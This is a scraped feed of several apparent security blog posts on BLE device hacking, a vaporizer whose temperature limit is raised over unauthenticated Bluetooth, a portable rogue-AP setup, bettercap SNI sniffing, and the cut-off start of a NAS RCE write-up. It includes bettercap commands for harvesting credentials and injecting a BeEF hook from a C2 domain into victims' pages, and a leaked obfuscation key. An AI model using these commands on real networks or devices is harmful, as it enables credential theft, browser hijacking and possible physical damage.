<p>Imagine you have a BT device, which 99% of the times it’s discoverable, on the same frequency and channel, always, that literally burps at you its information ( what it’s called <strong>advertisement data</strong>, <a href="/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">sometimes they also broadcast security tokens</a>, etc … to anyone … ), you connect to it (because 99.999999% of the times it allows anyone to connect) and the device tells you <strong>everything</strong> you need to know in order to control it, read data from it and write data to it … how kind, isn’t it? :D</p>
<p>You are provided with read and write primitives / channels ( called <code>characteristics</code> ), each one with a specific identifier, some of them <a href="https://www.bluetooth.com/specifications/gatt/services" target="_blank" rel="external">are standard</a> and some of them are usually vendor specific, therefore you won’t be able to easily map something like <code>d0611e78-bbb4-4591-a5f8-487910ae4366</code> to something like <code>Apple Continuity Service</code> (more on how to solve this problem later).</p>
<p>Rather than this, all the implementation details ( aka: the communication protocol ) are up to the vendor … you see now?</p>
<p><img src="/images/2017/09/chaos.jpg" alt="pure chaos"></p>
<h3 id="Methodologies-and-required-hardware"><a href="#Methodologies-and-required-hardware" class="headerlink" title="Methodologies and required hardware (?)"></a>Methodologies and required hardware (?)</h3><p>As I was saying yesterday night to Viss, you can approach BLE hacking in two ways.</p>
<p>You can go passive, therefore you’ll need a <a href="https://github.com/greatscottgadgets/ubertooth" target="_blank" rel="external">Ubertooth One</a> to sniff raw BLE packets out of the air and Wireshark to visualize them. In this case you’ll end up performing signal analysis / RE on the raw bitstream you’ve managed to capture, simply try some replay attack or blackbox fuzzing ( aka: throw mutated stuff back at the mother fucker ). As for this first methodology, <a href="http://blog.attify.com/2017/01/17/exploiting-iot-enabled-ble-smart-bulb-security/" target="_blank" rel="external">there’re already</a> plenty of good examples online, it’s just like sniffing TCP, but with BLE.</p>
<p>Or you can go active (the way I like it :D), and that doesn’t require any specific hardware other than a bluetooth dongle which supports BLE, most likely your Linux laptop already does, and exploit those little bastards for what they are, just <strong>retarded bluetooth devices</strong>. Find the mobile app (they always have one, they’re <strong>smart</strong> toys after all), reverse it to find the right characteristics to use for your goal and then just blow the thing up. My point is that you’ll end up reversing “something” anyway, so let it be cheap and effective, right?</p>
<p>Let’s start by verifying if your hardware supports BLE by performing a scan ( I’m assuming you are using GNU/Linux, bluez and all the default BT stack utilities are installed, etc ):</p>
<pre><code>sudo hcitool lescan
</code></pre><p>If it worked, you’ll see an output like:</p>
<pre><code>LE Scan ...
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF STORZ&amp;BICKEL
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF (unknown)
AA:BB:CC:DD:EE:FF [LG] webOS TV OLED55E6V
</code></pre><p>That means you’re ready to go. Go find the Android application of the device and reverse it, <a href="/2017/04/27/Android-Applications-Reversing-101/">here’s my 1 on 1 on Android reversing</a> and <a href="/tags/bluetooth/">here</a> you will find a few examples of how to use this approach.</p>
<p>I could now explain you how to read advertisement data using <code>hcitool</code>, how to connect to it using <code>gatttool</code> and how to enumerate services, characteristics and handles, how to mask flags and translate their bits to permissions, etc … but I made it a little bit easier for you (and for me), so let’s skip this boring stuff ok? :P</p>
<h3 id="Introducing-BLEAH"><a href="#Introducing-BLEAH" class="headerlink" title="Introducing BLEAH"></a>Introducing BLEAH</h3><p><a href="https://github.com/evilsocket/bleah" target="_blank" rel="external">BLEAH</a> is a <strong>dead easy to use tool</strong>, because retarded devices should be <strong>dead easy to hack</strong>, based on <a href="https://github.com/IanHarvey" target="_blank" rel="external">Iah Harvey</a>‘s <code>bluepy</code> python package.</p>
<p>But let me give you some examples and swag.</p>
<p>Scanning for BTLE devices continuously:</p>
<pre><code>sudo bleah -t0
</code></pre><p><img src="/images/2017/09/ss1.png" alt="scan"></p>
<p>Connect to a specific device and enumerate all the things:</p>
<pre><code>sudo bleah -b &quot;aa:bb:cc:dd:ee:ff&quot; -e
</code></pre><p><img src="/images/2017/09/ss2.png" alt="enum"></p>
<p>Write the bytes <code>hello world</code> to a specific characteristic of the device:</p>
<pre><code>sudo bleah -b &quot;aa:bb:cc:dd:ee:ff&quot; -u &quot;c7d25540-31dd-11e2-81c1-0800200c9a66&quot; -d &quot;hello world&quot;
</code></pre><p><img src="/images/2017/09/ss3.png" alt="write"></p>
<p>Hint: there’s a <code>--data-file</code> argument which is perfect in combination with things like <code>radamsa</code> … just saying.</p>
<p>As usual the public fork of this tool is on <a href="https://github.com/evilsocket/bleah" target="_blank" rel="external">github</a>, now you know and have everything you need to bring chaos in the BLE world, enjoy :D</p>
<div style="position:relative;height:0;padding-bottom:75.0%"><iframe src="https://www.youtube.com/embed/qbmWs6Jf5dc?ecver=2" width="480" height="360" frameborder="0" style="position:absolute;width:100%;height:100%;left:0" allowfullscreen></iframe></div>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This is not a post about BLE, but rather on how to hack it … well, to be honest, BLE devices are usually very easy to hack, so it’s just a quick intro to it, I’ll also take the chance to open source one of the last tools I’ve made and that I kept private so far. I moved the features I thought to be dangerous ( aka: auto fuzzing all the BLE things and bring chaos ) in a private fork which will stay private, however it’s not that complicated to chain &lt;code&gt;bleah&lt;/code&gt; with other tools ( cough … radamsa … cough ) and have &lt;strong&gt;lots of fun&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/09/dr_evil.jpg&quot; alt=&quot;dr.evil&quot;&gt;&lt;/p&gt;
&lt;p&gt;Oh and this is also because &lt;a href=&quot;https://twitter.com/Viss&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;someone&lt;/a&gt; asked me some intro on BLE, so yeah, his fault.&lt;/p&gt;
    
    </summary>
    
    
      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
    
      <category term="btle" scheme="https://www.evilsocket.net/tags/btle/"/>
    
      <category term="bluetooth" scheme="https://www.evilsocket.net/tags/bluetooth/"/>
    
      <category term="bluetooth low energy" scheme="https://www.evilsocket.net/tags/bluetooth-low-energy/"/>
    
      <category term="bleah" scheme="https://www.evilsocket.net/tags/bleah/"/>
    
  </entry>
  
  <entry>
    <title>Hacking a Herb Vaporizer to Set Its Temperature Limit From 190C to 6553.5C Remotely</title>
    <link href="https://www.evilsocket.net/2017/08/25/Mini-Post-Hacking-a-Herb-Vaporizer-using-GNU-Linux-and-BLE-raw-commands/"/>
    <id>https://www.evilsocket.net/2017/08/25/Mini-Post-Hacking-a-Herb-Vaporizer-using-GNU-Linux-and-BLE-raw-commands/</id>
    <published>2017-08-25T01:10:53.000Z</published>
    <updated>2017-08-25T20:04:23.221Z</updated>
    
    <content type="html"><![CDATA[<p>Tonight my brain decided, instead of sleeping (why even bother trying, right?), to start a <a href="/2015/01/29/nike-fuelband-se-ble-protocol-reversed/">new</a> short adventure in the <strong>Bluetooth Low Energy</strong> world. I’m a happy <a href="https://www.storz-bickel.com/eu/en/crafty.html" target="_blank" rel="external">Crafty</a> vaporizer owner and as I discovered by chance, I can access it using my laptop.</p>
<p><img src="/images/2017/08/ble_1.png" alt="ble_1"></p>
<a id="more"></a>
<p>BTLE is conceptually easy, you’ve got “descriptors”, each one with an unique identifier and each one is arbitrarily used by the vendor for configuration purposes, control of the device, etc by read or write operations. So, first thing first, let’s reverse <a href="https://play.google.com/store/apps/details?id=com.storz_bickel.app.m_vap" target="_blank" rel="external">their mobile application</a> in order to identify interesting descriptors!</p>
<p><img src="/images/2017/08/ble_2.png" alt="ble_2"></p>
<p>Here it is, we can read and write stuff with <strong>no authentication whatsoever</strong> … so, let’s get evil, shall we? :) </p>
<p>How about writing to:</p>
<pre><code>public static final UUID characteristicTargetTemperatureUUID = UUID.fromString(&quot;00000021-4C45-4B43-4942-265A524F5453&quot;);
</code></pre><p>The target temperature ( 190 C in my case ) is multiplied by 10 (<del>don’t ask</del> as someone <a href="https://www.reddit.com/r/netsec/comments/6vvroj/hacking_a_herb_vaporizer_to_set_its_temperature/dm4e4gj/" target="_blank" rel="external">vigorously pointed out</a>, that’s <em>“pretty common when you don’t have/want floating-point arithmetic, or you want to represent exact values for a certain precision”</em> … it doesn’t really matter for the scope of this blog post, but now we’re all happy) and stored as two bytes, <strong>so let’s try to overwrite it with the maximum!</strong> <em>-put evil laugh here-</em></p>
<p><img src="/images/2017/08/ble_temp.png" alt="ble_temp"></p>
<p>Which should be a limit of 6553.5 Celsius degrees.</p>
<p><img src="/images/2017/08/pew.jpg" alt="pew pew"></p>
<p><strong>BOOM BABY!!!</strong> <strong>I have no idea what happens if I turn it on now</strong> … it’s the only Crafty I have, and it’s not cheap, I’m not going to try, but the options are:</p>
<ol>
<li>Hopefully some firmware security measure blocks the device from melting.</li>
<li>Device melts in your hands.</li>
<li>Battery just dies before it melts. </li>
</ol>
<p>How likely is <strong>1</strong> given there’s no security at all at the BTLE layer? Maybe some hardware security device? If anyone has a spare Crafty to try, let me know …</p>
<h3 id="Disclosure"><a href="#Disclosure" class="headerlink" title="Disclosure"></a>Disclosure</h3><p>I can hear people screaming <strong>and what about responsible disclosure ?!</strong> … I don’t know why people give responsible disclosure for granted to be honest … I do this stuff for fun, if I need to start searching for contacts and wait for replies it becomes a job and it’s not fun anymore … ¯\_(ツ)_/¯</p>
<h3 id="Bonus-Level"><a href="#Bonus-Level" class="headerlink" title="Bonus Level"></a>Bonus Level</h3><p>On the info screen of the app, if you tap 5 times on the serial number and put the correct password, it’ll unlock some nice diagnostic menu … this is <code>SHA256(password)</code> :)</p>
<p><img src="/images/2017/08/ble_3.png" alt="ble_3"></p>
<p>Diagnostic menu options (<strong>also controllable via BTLE</strong>):</p>
<p><img src="/images/2017/08/ble_diag.png" alt="ble_3"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Tonight my brain decided, instead of sleeping (why even bother trying, right?), to start a &lt;a href=&quot;/2015/01/29/nike-fuelband-se-ble-protocol-reversed/&quot;&gt;new&lt;/a&gt; short adventure in the &lt;strong&gt;Bluetooth Low Energy&lt;/strong&gt; world. I’m a happy &lt;a href=&quot;https://www.storz-bickel.com/eu/en/crafty.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Crafty&lt;/a&gt; vaporizer owner and as I discovered by chance, I can access it using my laptop.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/08/ble_1.png&quot; alt=&quot;ble_1&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
    
      <category term="hacking" scheme="https://www.evilsocket.net/tags/hacking/"/>
    
      <category term="linux" scheme="https://www.evilsocket.net/tags/linux/"/>
    
      <category term="btle" scheme="https://www.evilsocket.net/tags/btle/"/>
    
      <category term="bluetooth" scheme="https://www.evilsocket.net/tags/bluetooth/"/>
    
      <category term="bluetooth low energy" scheme="https://www.evilsocket.net/tags/bluetooth-low-energy/"/>
    
      <category term="low energy" scheme="https://www.evilsocket.net/tags/low-energy/"/>
    
      <category term="terminal" scheme="https://www.evilsocket.net/tags/terminal/"/>
    
      <category term="crafty vaporizer" scheme="https://www.evilsocket.net/tags/crafty-vaporizer/"/>
    
      <category term="crafty" scheme="https://www.evilsocket.net/tags/crafty/"/>
    
      <category term="vaporizer" scheme="https://www.evilsocket.net/tags/vaporizer/"/>
    
  </entry>
  
  <entry>
    <title>GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup</title>
    <link href="https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"/>
    <id>https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/</id>
    <published>2017-08-15T15:13:21.000Z</published>
    <updated>2017-08-15T16:33:55.740Z</updated>
    
    <content type="html"><![CDATA[<p>It’s no secret I’ve been recently playing with the <a href="https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2" target="_blank" rel="external">GPD Pocket 7</a>, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the <a href="https://www.google.com/search?&amp;source=lnms&amp;tbm=isch&amp;q=open+zaurus+sl-c1000" target="_blank" rel="external">Sharp Zaurus</a> series. Considering that a <a href="https://twitter.com/evilsocket/status/896847606072127488" target="_blank" rel="external">lot of people were interested</a> I decided to write this post to share my impressions, installation procedure and configuration tips.</p>
<p><img src="https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg" alt="gpd"></p>
<a id="more"></a>
<h3 id="Specs"><a href="#Specs" class="headerlink" title="Specs"></a>Specs</h3><p>Let’s start with the hardware specs of this sweet little thing:</p>
<ul>
<li>7-inch full-HD (1920×1200) IPS touch display</li>
<li>Intel Atom x7-Z8750 CPU (Quad Core) @ 1.6GHz</li>
<li>8GB RAM</li>
<li>128GB eMMC</li>
<li>7,000 mAh battery (12 hours battery life estimated)</li>
<li>802.11ac WiFi</li>
<li>Bluetooth 4.1</li>
<li>1x USB 3.0 Type-C</li>
<li>1x USB 3.0 Type-A</li>
<li>micro HDMI</li>
<li>3.5mm headphone jack</li>
</ul>
<p><strong>Not bad at all!</strong> right?</p>
<h3 id="Installing-GNU-Linux"><a href="#Installing-GNU-Linux" class="headerlink" title="Installing GNU/Linux"></a>Installing GNU/Linux</h3><p>Despite they should start shipping the Ubuntu 16.04 models in a few days (?), I decided to buy the Windows version, which means I had to install GNU/Linux from scratch and overcome/fix several hardware issues … since I’m a good guy, let me share with you the correct procedure :D</p>
<ol>
<li>Download your GNU/Linux distribution ISO ( in my case, it was Ubuntu 17.04 ).</li>
<li>Clone <a href="https://github.com/cawilliamson/ansible-gpdpocket" target="_blank" rel="external">this repository</a> and run the <code>bootstrap-iso.sh</code> script against the ISO file.</li>
<li>Write the resulting <code>~/bootstrap.iso</code> file to an USB drive using UNetBootin or whatever you like.</li>
<li>Plug the USB drive to your GPD, turn it on and press the <code>DEL</code> button to enter BIOS and boot from it.</li>
</ol>
<p>This will start the usual GNU/Linux installation procedure.</p>
<p><strong>NOTE:</strong> Data on USB Type-C still does not work, but efforts are being made about it, we only need to wait.</p>
<h3 id="Updating-custom-Kernel-and-stuff"><a href="#Updating-custom-Kernel-and-stuff" class="headerlink" title="Updating custom Kernel and stuff."></a>Updating custom Kernel and stuff.</h3><p>After installation and the routine system update, you might want to periodically update the fixes and custom kernel from the repository, in order to do so you should run the <code>gpd-update</code> script as root, this will take 2-3 hours since the kernel is going to be compiled on the device itself.</p>
<p>If you are running Ubuntu 17.04 as me and are experiencing <a href="https://github.com/cawilliamson/ansible-gpdpocket/issues/49" target="_blank" rel="external">this issue</a>, you might want to do the following instead:</p>
<p><strong>Make sure apt is not locked and you have internet connectivity first.</strong></p>
<pre><code>sudo rm -rf /usr/src/ansible-gpdpocket
sudo git clone https://github.com/cawilliamson/ansible-gpdpocket.git /usr/src/ansible-gpdpocket
cd /usr/src/ansible-gpdpocket
sudo git reset --hard origin/master
</code></pre><p>Before you continue, edit the <code>roles/boot/tasks/debian.yml</code> file and <strong>remove this block</strong> from it:</p>
<pre><code>- name: install intel-microcode (iso creation = no)
  apt: name=intel-microcode
  when: chroot == false
  tags:
  - boot
</code></pre><p>( Don’t worry, you already have Intel microcode installed )</p>
<p>And eventually start the update process itself:</p>
<pre><code>sudo ANSIBLE_NOCOWS=1 ansible-playbook system.yml
</code></pre><p>After the update is over, reboot and you’re ready to go :)</p>
<h3 id="Getting-Offensive"><a href="#Getting-Offensive" class="headerlink" title="Getting Offensive"></a>Getting Offensive</h3><p>At this point, you have a quad core Intel cpu, GNU/Linux and an USB 3.0 port, I mean, imagination is the limit! </p>
<p>Personally, I like to have an Anker Astro E7 powerbank connected to the USB Type-C and the hardware I need to the USB 3.0 port (maybe with some <a href="https://www.amazon.it/gp/product/B0192W3HX8/ref=oh_aui_detailpage_o00_s00?ie=UTF8&amp;psc=1" target="_blank" rel="external">USB 3 hub</a>, to have appropriate bandwidth, powered by the same powerbank), then I can attach pretty much whatever I want to it, including an Alfa antenna, an Ubertooth One (great also to have a 2.4Ghz portable spectrum analyzer!) or some SDR card (most of SDR applications will require the full bandwidth of the USB port, which means it’s unlikely you’ll be able to use something else at the same time).</p>
<p>Here’s a very ugly PoC of what I mean, I’m still waiting for a decent USB hub to be delivered by Amazon:</p>
<p><img src="https://pbs.twimg.com/media/DHI-InZXgAEmggO.jpg" alt="stuff"></p>
<p>In its simplest form, my portable offensive configuration is:</p>
<ul>
<li>GPD powered by the aforementioned powerbank.</li>
<li>Main WiFi card connected to my smartphone (which is tethering via WiFi AP) as upstream.</li>
<li>Alfa AWUS036NHR 2000mW with a HUACAM HCM82 8dBi dualband antenna for rogue AP and packet injection.</li>
<li>Sensepost MANA running in <code>simple-nat</code> mode.</li>
<li>BetterCap for credentials harvesting, pcap capture and reporting.</li>
</ul>
<pre><code>sudo bettercap --no-spoofing --no-discovery -I YOUR_ALFA_INTERFACE -X
</code></pre><p>Or, if you feel really evil, you can also have the HTTP proxy inject your BEEF hook to every page:</p>
<pre><code>sudo bettercap ...same as before... --proxy-module injectjs --js-url http://your-beef-c2-domain/hook.js
</code></pre><p>If you’ll make bettercap save everything to a pcap file, this file will contains the traffic of all the targets and it will potentially become very big, I suggest you to use the USB hub and attach an external drive as well. Then just make bettercap write to it with appropriate command line arguments for offline inspection and credentials harvesting.</p>
<pre><code>sudo bettercap ...same... --sniffer-output /media/your/usbdrive/capture.pcap
</code></pre><p>… GOODBYE WIFI PINEAPPLE! :D</p>
<h3 id="Impressions-amp-Links"><a href="#Impressions-amp-Links" class="headerlink" title="Impressions &amp; Links"></a>Impressions &amp; Links</h3><p>TL;DR: This device is <strong>awesome</strong>, expensive, but still, <strong>awesome</strong>.</p>
<h5 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h5><p>Yes the layout is a very weird displaced QWERTY and yes the keys are small … you’ll get used to it unless you have very big hands.</p>
<h5 id="Battery-Life"><a href="#Battery-Life" class="headerlink" title="Battery Life"></a>Battery Life</h5><p>I didn’t try the battery life as I always use the powerbank (the USB devices are draining power, that would kill the internal 7000mAh battery), but people said they achieved <strong>3 hours of intense gaming</strong> on Windows, normal use on GNU/Linux should last quite long.</p>
<h5 id="Display"><a href="#Display" class="headerlink" title="Display"></a>Display</h5><p>Great definition and the <strong>touchscreen</strong> helps a lot navigating the menu … actually this is the very first time I find a touch screen to be really useful on Linux :D</p>
<h5 id="Mouse"><a href="#Mouse" class="headerlink" title="Mouse"></a>Mouse</h5><p>Yeah the “mouse” is crap, but usable … as I said, touchscreen FTW!</p>
<h5 id="Price"><a href="#Price" class="headerlink" title="Price"></a>Price</h5><p>Expensive, from 500 to 600 USD … it’s a little nice toy but you’ll have to pay for it.</p>
<h5 id="Speed-Usability"><a href="#Speed-Usability" class="headerlink" title="Speed / Usability"></a>Speed / Usability</h5><p>Despite being an Atom, the CPU works great, as long as you don’t spawn 1000000000 apps you’ll do just fine … I mean, if <a href="https://www.evilsocket.net/2016/03/31/how-to-build-your-own-rogue-gsm-bts-for-fun-and-profit/">you can run a rogue GSM BTS on a RPi</a>, this hardware is actually <strong>more than just fine</strong>.</p>
<h5 id="Connectivity"><a href="#Connectivity" class="headerlink" title="Connectivity"></a>Connectivity</h5><p>Internal WiFi is super stable and has decent coverage, Bluetooth also works great.</p>
<h5 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h5><p>Check …</p>
<ul>
<li>… <a href="https://reddit.com/r/GPDPocket/" target="_blank" rel="external">this</a> out to stay updated on mods and hacks …</li>
<li>… <a href="https://github.com/cawilliamson/ansible-gpdpocket" target="_blank" rel="external">this</a> for custom kernel and fixes …</li>
<li>… <a href="https://github.com/jwrdegoede/linux-sunxi" target="_blank" rel="external">this</a> for custom kernel developement …</li>
<li>and <a href="https://indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2" target="_blank" rel="external">this</a> for official updates.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;It’s no secret I’ve been recently playing with the &lt;a href=&quot;https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GPD Pocket 7&lt;/a&gt;, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the &lt;a href=&quot;https://www.google.com/search?&amp;amp;source=lnms&amp;amp;tbm=isch&amp;amp;q=open+zaurus+sl-c1000&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Sharp Zaurus&lt;/a&gt; series. Considering that a &lt;a href=&quot;https://twitter.com/evilsocket/status/896847606072127488&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;lot of people were interested&lt;/a&gt; I decided to write this post to share my impressions, installation procedure and configuration tips.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg&quot; alt=&quot;gpd&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="linux" scheme="https://www.evilsocket.net/tags/linux/"/>
    
      <category term="wifi pentesting" scheme="https://www.evilsocket.net/tags/wifi-pentesting/"/>
    
      <category term="gpd pocket 7" scheme="https://www.evilsocket.net/tags/gpd-pocket-7/"/>
    
      <category term="gpd" scheme="https://www.evilsocket.net/tags/gpd/"/>
    
      <category term="wireless" scheme="https://www.evilsocket.net/tags/wireless/"/>
    
      <category term="sigint" scheme="https://www.evilsocket.net/tags/sigint/"/>
    
      <category term="sdr" scheme="https://www.evilsocket.net/tags/sdr/"/>
    
      <category term="rogue ap" scheme="https://www.evilsocket.net/tags/rogue-ap/"/>
    
      <category term="mana" scheme="https://www.evilsocket.net/tags/mana/"/>
    
      <category term="pentest" scheme="https://www.evilsocket.net/tags/pentest/"/>
    
      <category term="red teaming" scheme="https://www.evilsocket.net/tags/red-teaming/"/>
    
      <category term="hardware" scheme="https://www.evilsocket.net/tags/hardware/"/>
    
      <category term="equipment" scheme="https://www.evilsocket.net/tags/equipment/"/>
    
  </entry>
  
  <entry>
    <title>TLS, Server Name Indication and Why We Need to Encrypt It</title>
    <link href="https://www.evilsocket.net/2017/06/30/BetterCap-1-6-1-TLS-Server-Name-Indication-and-Why-We-Need-to-Encrypt-It/"/>
    <id>https://www.evilsocket.net/2017/06/30/BetterCap-1-6-1-TLS-Server-Name-Indication-and-Why-We-Need-to-Encrypt-It/</id>
    <published>2017-06-30T10:28:18.000Z</published>
    <updated>2017-08-11T14:28:47.027Z</updated>
    
    <content type="html"><![CDATA[<p>Yesterday I released version 1.6.1 of <a href="https://bettercap.org" target="_blank" rel="external">bettercap</a> and among other things, you can read in the changelog:</p>
<pre><code>* Huge improvement on HTTPS parser, now it parses TLS Client Hello messages with SNI extension in order to extract the real hostname.
...
</code></pre><p>But what does this actually mean? And how can we protect ourselves from it? (Hint: <strong>we can’t, yet</strong>)</p>
<p><img src="/images/2017/07/sni.png" alt="sni"></p>
<a id="more"></a>
<h1 id="Server-Name-Indication"><a href="#Server-Name-Indication" class="headerlink" title="Server Name Indication"></a>Server Name Indication</h1><p>Let’s take a simple HTTP request to explain the concept, this is a GET request to the index of somesite.com:</p>
<pre><code>GET / HTTP/1.1
Host: somesite.com
Connection: close
</code></pre><p>As we all know, once it gets this request the server is able to “understand” what virtual host it’s supposed to serve by reading the <code>Host</code> header, but what happens when the request is HTTPS and therefore the server can not read the Host header before providing the certificate?<br>What if server X is hosting multiple domains behind HTTPS? What’s the certificate it should send to the client? Here it comes <strong>Server Name Indication</strong> ( <a href="https://en.wikipedia.org/wiki/Server_Name_Indication" target="_blank" rel="external">SNI</a> ) for the rescue!</p>
<p>SNI is a mechanism which has been introduced in TLS as an extension to solve this problem, long story short, during the TLS handshake the client will send the name of the host it wants to connect to ( pretty much like the Host header on HTTP ), this piece of information is going to be transmitted <strong>unencrypted</strong> ( it has to! ), therefore we can intercept it.</p>
<p>As you can see in the image, by parsing such handshakes, bettercap is now able to tell you <strong>exactly</strong> what websites the target is browsing even if they’re on HTTPS, while the version before only “assumed” which was the domain by resolving it from the IP (and most of the times, failing miserably to give any useful result).</p>
<h1 id="How"><a href="#How" class="headerlink" title="How"></a>How</h1><p>Very simple, with just a <a href="https://github.com/evilsocket/bettercap/blob/master/lib/bettercap/sniffer/parsers/https.rb" target="_blank" rel="external">few lines</a> of (bad) code of course!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"></div><div class="line"># poor man&apos;s TLS Client Hello with SNI extension parser :P</div><div class="line">if pkt.respond_to?(:tcp_dst) and \</div><div class="line"> pkt.payload[0] == &quot;\x16&quot; and \</div><div class="line"> pkt.payload[1] == &quot;\x03&quot; and \</div><div class="line"> pkt.payload =~ /\x00\x00.&#123;4&#125;\x00.&#123;2&#125;([a-z0-9]+([\-\.]&#123;1&#125;[a-z0-9]+)*\.[a-z]&#123;2,6&#125;)\x00/</div><div class="line">hostname = $1</div><div class="line">if pkt.tcp_dst != 443</div><div class="line">  hostname += &quot;:#&#123;pkt.tcp_dst&#125;&quot;</div><div class="line">end</div><div class="line"></div><div class="line">...</div></pre></td></tr></table></figure>
<h1 id="What-can-we-do-about-it"><a href="#What-can-we-do-about-it" class="headerlink" title="What can we do about it?"></a>What can we do about it?</h1><p><img src="/images/2017/07/encrypt.png" alt="encrypt all the things"></p>
<p>Seriously, there’s not much we can do about it right now, which means <strong>even if you’re using HTTPS only, the domains you’re browsing are leaked on the network anyway … adios privacy!</strong> The only logical thing would be to <a href="https://www.ietf.org/proceedings/94/slides/slides-94-tls-8.pdf" target="_blank" rel="external">encrypt the SNI payload</a> as suggested in this document ( tnx to <a href="https://twitter.com/fpietrosanti" target="_blank" rel="external">Fabio</a> for the link! ), but I guess we’ll have to wait some time :)</p>
<h1 id="One-more-thing"><a href="#One-more-thing" class="headerlink" title="One more thing"></a>One more thing</h1><p><strong>USE A VPN, ESPECIALLY ON PUBLIC NETWORKS FOR F°°°’S SAKE!!!</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Yesterday I released version 1.6.1 of &lt;a href=&quot;https://bettercap.org&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;bettercap&lt;/a&gt; and among other things, you can read in the changelog:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* Huge improvement on HTTPS parser, now it parses TLS Client Hello messages with SNI extension in order to extract the real hostname.
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But what does this actually mean? And how can we protect ourselves from it? (Hint: &lt;strong&gt;we can’t, yet&lt;/strong&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/2017/07/sni.png&quot; alt=&quot;sni&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="tls" scheme="https://www.evilsocket.net/tags/tls/"/>
    
      <category term="sni" scheme="https://www.evilsocket.net/tags/sni/"/>
    
      <category term="server name indication" scheme="https://www.evilsocket.net/tags/server-name-indication/"/>
    
      <category term="privacy" scheme="https://www.evilsocket.net/tags/privacy/"/>
    
  </entry>
  
  <entry>
    <title>TerraMaster NAS TOS &lt;= 3.0.30 Unauthenticated RCE as Root</title>
    <link href="https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/"/>
    <id>https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/</id>
    <published>2017-05-30T11:15:28.000Z</published>
    <updated>2017-08-11T14:28:47.043Z</updated>
    
    <content type="html"><![CDATA[<p>Recently I bought a TerraMaster F2-420 NAS from Amazon in order to store my private code, backups and this kind of stuff. As soon as it arrived I started to play with its web interface and eventually I wanted to see how it was implemented, moreover I was curious to see if I could find any remotely exploitable vulnerability.</p>
<p>As you can see … I succeeded :)</p>
<p><img src="/images/2017/05/exploit.png" alt="nas"></p>
<a id="more"></a>
<p>Once connected to the NAS through SSH, I realized the whole interface was a PHP application stored on <code>/usr/www/</code>, but unfortunately the source code was obfuscated:</p>
<p><img src="/images/2017/05/obfuscated.png" alt="obfuscated"></p>
<p>Printing PHP compilation options and modules revealed what kind of obfuscation was going on, <code>php_screw</code>:</p>
<p><img src="/images/2017/05/configure.png" alt="configure"></p>
<p>Lucky me, there’s the <a href="https://github.com/dehydr8/php_unscrew" target="_blank" rel="external">php_unscrew</a> tool written by Osama Khalid, I only had to follow the instructions on the repository in order to extract the key and header length from the encrypted files on the NAS, which happened to be <code>d311ea00d301b80c3f00</code> and <code>13</code>.</p>
<p><img src="/images/2017/05/bingo.png" alt="bingo"></p>
<p>At this stage, I could read any PHP file running on the NAS, until I found what I’ve been looking for, <code>/usr/www/include/upload.php</code> which, as you guessed, handles file uploads to the NAS … and here’s all the authentication involved:</p>
